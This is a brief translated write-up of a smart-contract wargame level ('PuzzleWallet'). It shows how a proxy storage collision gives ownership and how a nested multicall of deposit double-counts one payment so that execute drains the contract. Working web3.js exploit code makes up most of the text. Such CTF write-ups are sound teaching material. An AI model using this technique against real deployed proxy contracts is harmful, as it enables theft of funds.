## Description
In PuzzleProxy through proposeNewAdmin passing the address, then through the proxy call addToWhitelist, and since PuzzleWallet is called through deoegatecall then owner == pendingAdmin

Next change slot 1 - maxBalance. To do this, we need to reset the contract balance to 0.

To do this, we need to call the execute function. We need to bypass depositCalled for this multicall[deposit, multicall[deposit]]

It was interesting to do via web3js

Translated with DeepL.com (free version)

```
const depositAbi = {
"constant": false,
"inputs": [],
"name": "deposit",
"outputs": [],
"payable": true,
"stateMutability": "payable",
"type": "function"
};
const depositData = web3.eth.abi.encodeFunctionCall(depositAbi, []);
const multicallAbi = {
"constant": false,
"inputs": [
{
"name": "data",
"type": "bytes[]"
}
],
"name": "multicall",
"outputs": [],
"payable": true,
"stateMutability": "payable",
"type": "function"
};
const innerMulticallData = web3.eth.abi.encodeFunctionCall(multicallAbi, [[depositData]]);

const contract2 = new web3.eth.Contract(contract.abi, contract.address);

await contract2.methods.multicall([depositData, innerMulticallData]).send({
from: player,
value: web3.utils.toWei('0.001', 'ether')
});

await contract.execute(player,2000000000000000,"0x")

await web3.utils.toBN(player).toString();
```